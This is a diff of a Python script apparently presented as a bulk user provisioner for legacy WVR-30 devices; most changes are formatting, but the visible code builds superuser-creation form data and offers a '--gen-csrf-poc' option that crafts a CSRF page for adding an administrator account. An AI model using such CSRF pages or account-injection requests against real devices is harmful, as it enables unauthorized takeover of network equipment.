@@ -17,12 +17,14 @@ For devices on 10.7.4+, use the newer REST API approach instead.
 """
 
 import argparse
-import logging
 import sys
+import requests
+import logging
 from urllib.parse import urljoin
 
 logging.basicConfig(
-    level=logging.INFO, format="%(asctime)s [%(levelname)s] %(funcName)s: %(message)s"
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(funcName)s: %(message)s"
 )
 logger = logging.getLogger("wvr30_provisioner")
 
@@ -46,12 +48,12 @@ def build_payload(username: str, password: str, role: str = "superuser") -> dict
     paired with this form data is sufficient to create an account.
     """
     return {
-        "action": "add",
-        "username": username,
-        "password": password,
+        "action":    "add",
+        "username":  username,
+        "password":  password,
         "password2": password,
-        "role": role,
-        "submit": "Add User",
+        "role":      role,
+        "submit":    "Add User",
     }
 
 
@@ -87,7 +89,8 @@ def craft_csrf_form_html(target_url: str, username: str, password: str) -> str:
     return html
 
 
-def provision_user(base_url: str, session_cookie: str, username: str, password: str) -> bool:
+def provision_user(base_url: str, session_cookie: str,
+                   username: str, password: str) -> bool:
     """
     Directly provision a superuser account on a WVR-30 device.
 
@@ -155,17 +158,16 @@ def main():
     parser = argparse.ArgumentParser(
         description="WVR-30 bulk user provisioner (legacy firmware, pre-10.7.4)"
     )
-    parser.add_argument("--host", default=DEFAULT_BASE_URL, help="Base URL of management interface")
-    parser.add_argument(
-        "--session", required=True, help="Active administrator session cookie value"
-    )
-    parser.add_argument("--username", default=NEW_ADMIN_USER, help="New superuser account name")
-    parser.add_argument("--password", default=NEW_ADMIN_PASS, help="New superuser account password")
-    parser.add_argument(
-        "--gen-csrf-poc",
-        action="store_true",
-        help="Output a CSRF PoC HTML page instead of direct POST",
-    )
+    parser.add_argument("--host",     default=DEFAULT_BASE_URL,
+                        help="Base URL of management interface")
+    parser.add_argument("--session",  required=True,
+                        help="Active administrator session cookie value")
+    parser.add_argument("--username", default=NEW_ADMIN_USER,
+                        help="New superuser account name")
+    parser.add_argument("--password", default=NEW_ADMIN_PASS,
+                        help="New superuser account password")
+    parser.add_argument("--gen-csrf-poc", action="store_true",
+                        help="Output a CSRF PoC HTML page instead of direct POST")
     args = parser.parse_args()
 
     version = check_firmware_version(args.host, args.session)
